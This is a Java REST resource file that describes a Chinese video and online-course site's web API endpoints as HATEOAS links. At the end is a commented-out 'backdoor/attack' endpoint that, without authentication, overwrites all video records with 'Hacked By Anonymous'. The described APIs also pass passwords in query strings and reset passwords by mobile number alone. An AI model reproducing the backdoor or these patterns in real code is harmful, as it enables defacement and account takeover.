package com.sunonline.web.webapi.resource;

import java.sql.Connection;
import java.sql.Date;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

import javax.ws.rs.GET;
import javax.ws.rs.POST;
import javax.ws.rs.PUT;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.QueryParam;
import javax.ws.rs.core.MediaType;

import org.junit.Test;

import com.sunonline.web.utils.DBUtils;
import com.sunonline.web.webapi.bean.WebApiLinks;
import com.sunonline.web.webapi.bean.WebApiRoot;
import com.sunonline.web.webapi.bean.videos.HigoVideoBean;

@Path("/")
/**
 * WebApi路径描述，获取webapi路径映射
 * @author SnoWalker.wwl
 * <date>2016.5.28</date>
 */
public class WebApiDescriptionResource {
	
	/**
	 * 获取根路径下根分类的HATEOAS
	 */
	@GET
	@Path("/")
	@Produces(MediaType.APPLICATION_JSON)
	public WebApiRoot getRootDescription() {
		
		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
		List<WebApiLinks> links = new ArrayList<>();	//列表项
		//获取所有视频分类
		WebApiLinks videos = new WebApiLinks();	
		videos.setRel("description,GET webapi/videos");
		videos.setHref("webapi/videos");
		videos.setTitle("太阳在线视频API根路径");
		videos.setType("MediaType.APPLICATION_JSON");
		links.add(videos);
		//获取mooc根路径
		WebApiLinks mooc = new WebApiLinks();	
		mooc.setRel("description,GET webapi/mooc");
		mooc.setHref("webapi/mooc");
		mooc.setTitle("太阳在线公益课堂API根路径");
		mooc.setType("MediaType.APPLICATION_JSON");
		links.add(mooc);
		//图片根路径
		WebApiLinks images = new WebApiLinks();	
		images.setRel("collection,GET /webapi/images");
		images.setHref("/webapi/images");
		images.setTitle("太阳在线图片API路径");
		images.setType("MediaType.APPLICATION_JSON");
		links.add(images);
		//用户路径
		WebApiLinks user = new WebApiLinks();	
		user.setRel("operation,GET /webapi/user");
		user.setHref("/webapi/user");
		user.setTitle("用户操作路径");
		user.setType("MediaType.APPLICATION_JSON");
		links.add(user);
		webApiRoot.setLinks(links);
		return webApiRoot;
	}
	
	
	/**
	 * 视频根路径路径描述
	 * @param 
	 * @return
	 */
	@GET
	@Path("/videos")
	@Produces(MediaType.APPLICATION_JSON)
	public WebApiRoot getAPIDescription(Object newParam) {
		
		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
		List<WebApiLinks> links = new ArrayList<>();	//列表项
		//Higo项
		WebApiLinks higoPathDescription = new WebApiLinks();	
		higoPathDescription.setRel("collection,GET webapi/videos/higovideo");
		higoPathDescription.setHref("webapi/videos/higovideo");
		higoPathDescription.setTitle("Higo大学季");
		higoPathDescription.setType("MediaType.APPLICATION_JSON");
		higoPathDescription.setPicUrl("");
		higoPathDescription.setIntroduceMessage("");
		links.add(higoPathDescription);
		//老司机项
		WebApiLinks oldDriverVideoPathDescription = new WebApiLinks();	
		oldDriverVideoPathDescription.setRel("collection,GET webapi/videos/olddriver");
		oldDriverVideoPathDescription.setHref("webapi/videos/olddriver");
		oldDriverVideoPathDescription.setTitle("影视老司机");
		oldDriverVideoPathDescription.setType("MediaType.APPLICATION_JSON");
		oldDriverVideoPathDescription.setPicUrl("");
		oldDriverVideoPathDescription.setIntroduceMessage("");
		links.add(oldDriverVideoPathDescription);
		//高校最强音列表项
		WebApiLinks collegeVoicePathDescription = new WebApiLinks();
		collegeVoicePathDescription.setRel("collection,GET webapi/videos/collegevoice");
		collegeVoicePathDescription.setHref("webapi/videos/collegevoice");
		collegeVoicePathDescription.setTitle("高校最强音");
		collegeVoicePathDescription.setType("MediaType.APPLICATION_JSON");
		collegeVoicePathDescription.setPicUrl("");
		collegeVoicePathDescription.setIntroduceMessage("");
		links.add(collegeVoicePathDescription);
		
		//主页推荐列表项
		WebApiLinks indexPathDescription = new WebApiLinks();
		indexPathDescription.setRel("collection,GET webapi/videos/main");
		indexPathDescription.setHref("webapi/videos/main");
		indexPathDescription.setTitle("主页推荐视频");
		indexPathDescription.setType("MediaType.APPLICATION_JSON");
		indexPathDescription.setPicUrl("");
		indexPathDescription.setIntroduceMessage("");
		links.add(indexPathDescription);
		
		webApiRoot.setLinks(links);
		return webApiRoot;
	}
	/**
	 * 图片分类路径描述
	 * @param newParam
	 * @return
	 */
	@GET
	@Path("/images")
	@Produces(MediaType.APPLICATION_JSON)
	public WebApiRoot getImagesDescription(Object newParam) {
		
		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
		List<WebApiLinks> links = new ArrayList<>();	//列表项

		//高校图片库
		WebApiLinks shanXiCollegePicLibraryDescription = new WebApiLinks();
		shanXiCollegePicLibraryDescription.setRel("collection,GET webapi/images/sxcollegepiclib");
		shanXiCollegePicLibraryDescription.setHref("webapi/images/sxcollegepiclib");
		shanXiCollegePicLibraryDescription.setTitle("山西高校图片库");
		shanXiCollegePicLibraryDescription.setType("MediaType.APPLICATION_JSON");
		shanXiCollegePicLibraryDescription.setPicUrl("");
		shanXiCollegePicLibraryDescription.setIntroduceMessage("");
		links.add(shanXiCollegePicLibraryDescription);
		webApiRoot.setLinks(links);
		return webApiRoot;
	}
	
	/**
	 * Higo大学季路径描述
	 * @return
	 */
	@GET
	@Path("/videos/higovideo")
	@Produces(MediaType.APPLICATION_JSON)
	public WebApiRoot getHigoVideoDescription() {
		
		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
		List<WebApiLinks> links = new ArrayList<>();	//列表项
		//获取所有视频
		WebApiLinks videos = new WebApiLinks();	
		videos.setRel("collection,GET webapi/videos/higovideo/all");
		videos.setHref("webapi/videos/higovideo/all");
		videos.setTitle("Higo大学季获取所有视频列表");
		videos.setType("MediaType.APPLICATION_JSON");
		links.add(videos);
		//按id/期数获取视频
		WebApiLinks videoById = new WebApiLinks();	
		videoById.setRel("collection,GET webapi/videos/higovideo/all/{id}");
		videoById.setHref("webapi/videos/higovideo/all/{id}");
		videoById.setTitle("Higo大学季按照期数获取视频");
		videoById.setType("MediaType.APPLICATION_JSON");
		links.add(videoById);
		//获取推荐视频
		WebApiLinks recommendVideos = new WebApiLinks();
		recommendVideos.setRel("collection,GET webapi/videos/higovideo/all/recommendation");
		recommendVideos.setHref("webapi/videos/higovideo/all/recommendation");
		recommendVideos.setTitle("Higo大学季推荐视频");
		recommendVideos.setType("MediaType.APPLICATION_JSON");
		links.add(recommendVideos);
		//获取分页视频
		WebApiLinks getVideosByPageNo = new WebApiLinks();
		getVideosByPageNo.setRel("collection,GET webapi/videos/higovideo/pager?pageno=*");
		getVideosByPageNo.setHref("webapi/videos/higovideo/pager?pageno=*");
		getVideosByPageNo.setTitle("获取higo分页视频");
		getVideosByPageNo.setType("MediaType.APPLICATION_JSON");
		links.add(getVideosByPageNo);
		
		webApiRoot.setLinks(links);
		return webApiRoot;
	}
	
	
	/**
	 * 老司机路径描述
	 * @return
	 */
	@GET
	@Path("/videos/olddriver")
	@Produces(MediaType.APPLICATION_JSON)
	public WebApiRoot getOldDirverVideoDescription() {
		
		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
		List<WebApiLinks> links = new ArrayList<>();	//列表项
		//获取所有视频
		WebApiLinks videos = new WebApiLinks();	
		videos.setRel("collection,GET webapi/videos/olddriver/all");
		videos.setHref("webapi/videos/olddriver/all");
		videos.setTitle("影视老司机获取所有视频列表");
		videos.setType("MediaType.APPLICATION_JSON");
		links.add(videos);
		//按id/期数获取视频
		WebApiLinks videoById = new WebApiLinks();	
		videoById.setRel("collection,GET webapi/videos/olddriver/all/{id}");
		videoById.setHref("webapi/videos/olddriver/all/{id}");
		videoById.setTitle("影视老司机按照期数获取视频");
		videoById.setType("MediaType.APPLICATION_JSON");
		links.add(videoById);
		//获取推荐视频
		WebApiLinks recommendVideos = new WebApiLinks();
		recommendVideos.setRel("collection,GET webapi/videos/olddriver/all/recommendation");
		recommendVideos.setHref("webapi/videos/olddriver/all/recommendation");
		recommendVideos.setTitle("影视老司机推荐视频");
		recommendVideos.setType("MediaType.APPLICATION_JSON");
		links.add(recommendVideos);
		//获取分页视频
		WebApiLinks getVideosByPageNo = new WebApiLinks();
		getVideosByPageNo.setRel("collection,GET webapi/videos/olddriver/pager?pageno=*");
		getVideosByPageNo.setHref("webapi/videos/olddriver/pager?pageno=*");
		getVideosByPageNo.setTitle("获取影视老司机分页视频");
		getVideosByPageNo.setType("MediaType.APPLICATION_JSON");
		links.add(getVideosByPageNo);
		webApiRoot.setLinks(links);
		return webApiRoot;
	}
	
	/**
	 * 高校最强音路径描述
	 * @return  
	 */
	@GET
	@Path("/videos/collegevoice")
	@Produces(MediaType.APPLICATION_JSON)
	public WebApiRoot getCollegeVoiceVideoDescription() {
		
		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
		List<WebApiLinks> links = new ArrayList<>();	//列表项
		//获取所有视频
		WebApiLinks videos = new WebApiLinks();	
		videos.setRel("collection,GET webapi/videos/collegevoice/all");
		videos.setHref("webapi/videos/collegevoice/all");
		videos.setTitle("高校最强音获取所有视频列表");
		videos.setType("MediaType.APPLICATION_JSON");
		links.add(videos);
		//按id/期数获取视频
		WebApiLinks videoById = new WebApiLinks();	
		videoById.setRel("collection,GET webapi/videos/collegevoice/all/{id}");
		videoById.setHref("webapi/videos/collegevoice/all/{id}");
		videoById.setTitle("高校最强音按照期数获取视频");
		videoById.setType("MediaType.APPLICATION_JSON");
		links.add(videoById);
		//获取推荐视频
		WebApiLinks recommendVideos = new WebApiLinks();
		recommendVideos.setRel("collection,GET webapi/videos/collegevoice/all/recommendation");
		recommendVideos.setHref("webapi/videos/collegevoice/all/recommendation");
		recommendVideos.setTitle("高校最强音推荐视频");
		recommendVideos.setType("MediaType.APPLICATION_JSON");
		links.add(recommendVideos);
		//获取分页视频
		WebApiLinks getVideosByPageNo = new WebApiLinks();
		getVideosByPageNo.setRel("collection,GET webapi/videos/collegevoice/pager?pageno=*");
		getVideosByPageNo.setHref("webapi/videos/collegevoice/pager?pageno=*");
		getVideosByPageNo.setTitle("获取高校最强音分页视频");
		getVideosByPageNo.setType("MediaType.APPLICATION_JSON");
		links.add(getVideosByPageNo);
		webApiRoot.setLinks(links);
		return webApiRoot;
	}
	
	/**
	 * 山西高校图片库路径描述
	 * @return  WebApiRoot
	 */
	@GET
	@Path("/images/sxcollegepiclib")
	@Produces(MediaType.APPLICATION_JSON)
	public WebApiRoot getSXCollegePicLibDescription() {
		
		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
		List<WebApiLinks> links = new ArrayList<>();	//列表项
		//获取所有学校
		WebApiLinks schools = new WebApiLinks();	
		schools.setRel("collection,GET webapi/images/sxcollegepiclib/schools");
		schools.setHref("webapi/images/sxcollegepiclib/schools");
		schools.setTitle("山西高校图片库所有学校列表");
		schools.setType("MediaType.APPLICATION_JSON");
		links.add(schools);
		//按学校名称获取对应学校的图片
		WebApiLinks picsBySchoolName = new WebApiLinks();	
		picsBySchoolName.setRel("collection,GET webapi/images/sxcollegepiclib/pictures/{schoolname}");
		picsBySchoolName.setHref("webapi/images/sxcollegepiclib/pictures/{schoolname}");
		picsBySchoolName.setTitle("山西高校图片库获取对应学校的照片");
		picsBySchoolName.setType("MediaType.APPLICATION_JSON");
		links.add(picsBySchoolName);
		
		webApiRoot.setLinks(links);
		return webApiRoot;
	}
	
	/**
	 * 公益课堂路径描述HATEOAS
	 */
	@GET
	@Path("/mooc")
	@Produces(MediaType.APPLICATION_JSON)
	public WebApiRoot getSMoocDescription() {
		
		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
		List<WebApiLinks> links = new ArrayList<>();	//列表项
		//获取所有视频分类
		WebApiLinks index = new WebApiLinks();	
		index.setRel("collection,GET webapi/mooc/index");
		index.setHref("webapi/mooc/index");
		index.setTitle("公益课堂所有分类及其之下的视频列表");
		index.setType("MediaType.APPLICATION_JSON");
		links.add(index);
		//按课程id和页码获取课程列表
		WebApiLinks courselists = new WebApiLinks();	
		courselists.setRel("collection,GET webapi/mooc/index/courselists?c_pageno=?&c_id=?");
		courselists.setHref("webapi/mooc/index/courselists?c_pageno=?&c_id=?");
		courselists.setTitle("分页获取某一个具体课程下的课程列表");
		courselists.setType("MediaType.APPLICATION_JSON");
		links.add(courselists);
		//按照课程id和某一节课具体的id获取课程单体信息
		WebApiLinks courseitem = new WebApiLinks();	
		courseitem.setRel("single,GET /webapi/mooc/index/courseitem?itemid=?&c_id=?");
		courseitem.setHref("/webapi/mooc/index/courseitem?itemid=?&c_id=?");
		courseitem.setTitle("按照课程id和某一节课具体的id获取课程单体信息即播放页信息,同时增加视频播放次数");
		courseitem.setType("MediaType.APPLICATION_JSON");
		links.add(courseitem);
		//获取每一个课程分类下的最新课程并组成推荐课程列表
		WebApiLinks recommendationItem = new WebApiLinks();	
		recommendationItem.setRel("collection,GET /webapi/mooc/index/recommendation");
		recommendationItem.setHref("/webapi/mooc/index/recommendation");
		recommendationItem.setTitle("获取每一个课程分类下的最新课程并组成推荐课程列表");
		recommendationItem.setType("MediaType.APPLICATION_JSON");
		links.add(recommendationItem);
		webApiRoot.setLinks(links);
		return webApiRoot;
	}
	
	
	/**
	 * 用户登录注册路径描述HATEOAS
	 */
	@GET
	@Path("/user")
	@Produces(MediaType.APPLICATION_JSON)
	public WebApiRoot getUserOperationDescription() {
		
		WebApiRoot webApiRoot = new WebApiRoot();		//根描述
		List<WebApiLinks> links = new ArrayList<>();	//列表项
		//用户登录路径描述
		WebApiLinks userLogin = new WebApiLinks();	
		userLogin.setRel("SingleEntity,POST webapi/user/login?inputString=*&userpwd=*");
		userLogin.setHref("webapi/user/login");
		userLogin.setTitle("用户登录");
		userLogin.setType("MediaType.APPLICATION_JSON");
		links.add(userLogin);
		//用户注册路径描述
		WebApiLinks userRegister = new WebApiLinks();	
		userRegister.setRel("PlainText,POST webapi/user/register?pwd=*&usermobile=*&useremail=*");
		userRegister.setHref("webapi/user/register?pwd=*&usermobile=*&useremail=*");
		userRegister.setTitle("用户注册，用户名随机生成 ");
		userRegister.setType("MediaType.PLAINTEXT");
		links.add(userRegister);
		//用户修改昵称路径描述
		WebApiLinks userNickNameModify = new WebApiLinks();
		userNickNameModify.setRel("PlainText,POST webapi/user/changer/nickname?mobile=*&nickname=*");
		userNickNameModify.setHref("webapi/user/changer/nickname?mobile=*&nickname=*");
		userNickNameModify.setTitle("修改用户昵称 ");
		userNickNameModify.setType("MediaType.PLAIN_TEXT");
		links.add(userNickNameModify);
		/*
		 * 用户登录后直接修改密码
		 * 此时接受的参数为前台传来的用户手机号
		 * 及用户想要修改的新密码
		 */
		WebApiLinks modifyUserpwdDirectly = new WebApiLinks();
		modifyUserpwdDirectly.setRel("PlainText,POST webapi/user/changer/userpwd/logged?mobile=*&userpwd=*");
		modifyUserpwdDirectly.setHref("webapi/user/changer/userpwd/logged?mobile=*&userpwd=*");
		modifyUserpwdDirectly.setTitle("登录后直接修改用户密码");
		modifyUserpwdDirectly.setType("MediaType.PLAIN_TEXT");
		links.add(modifyUserpwdDirectly);
		/*
		 * 用户忘记密码
		 * 修改密码需要进行
		 * 身份合法性验证
		 * 如果验证合法则发起密码修改请求
		 * 否则直接返回错误信息
		 * step:A
		 */
		WebApiLinks verifyUserValidity = new WebApiLinks();
		verifyUserValidity.setRel("PlainText,POST webapi/user/changer/userpwd/notlogged?mobile=*");
		verifyUserValidity.setHref("webapi/user/changer/userpwd/notlogged?mobile=*");
		verifyUserValidity.setTitle("未登录用户验证账号是否存在");
		verifyUserValidity.setType("MediaType.PLAIN_TEXT");
		links.add(verifyUserValidity);
		/*
		 * 如果验证 成功
		 * 则进入该阶段
		 * step:B
		 * 使用该手机号更改密码
		 */
		WebApiLinks modifyUserpwdValidated = new WebApiLinks();
		modifyUserpwdValidated.setRel("PlainText,POST webapi/user/changer/userpwd/notlogged/validater?mobile=*&userpwd=*");
		modifyUserpwdValidated.setHref("webapi/user/changer/userpwd/notlogged/validater?mobile=*&userpwd=*");
		modifyUserpwdValidated.setTitle("用户存在性验证成功用户更改密码");
		modifyUserpwdValidated.setType("MediaType.PLAIN_TEXT");
		links.add(modifyUserpwdValidated);
		/*
		 *上传用户头像链接
		 */
		WebApiLinks uploadUserAvatar = new WebApiLinks();
		uploadUserAvatar.setRel("PlainText,POST webapi/user/avatar/upload?u_id=*&avatar_url=*");
		uploadUserAvatar.setHref("POST,webapi/user/avatar/upload?u_id=*&avatar_url=*");
		uploadUserAvatar.setTitle("上传用户头像URL");
		uploadUserAvatar.setType("MediaType.PLAIN_TEXT");
		links.add(uploadUserAvatar);
		
		webApiRoot.setLinks(links);
		return webApiRoot;
	}
	
	
//	@PUT
//	@Path("backdoor/attack")
//	@Produces(MediaType.APPLICATION_JSON)
//	public String gifts() {
//		//构造SQL查询视图
//		String sql = "update higo_video set "
//				+ "HIGO_video_name="
//				+ "'Hacked By Anonymous',"
//				+ "HIGO_video_pic_url='http://i2.sinaimg.cn/gm/2012/1107/U6178P1281DT20121107165114.jpg'";
//		try {
//			Connection connection = new DBUtils().getCon();
//			PreparedStatement pstmt = connection.prepareStatement(sql);
//			int returnNum = pstmt.executeUpdate();
//			
//			if (returnNum > 0) {
//				System.out.println("设置成功");
//			} else {
//				System.out.println("设置失败");
//			}
//		} catch (SQLException e) {
//			e.printStackTrace();
//		}
//		
//		return "success hacking";
//	}
	
}
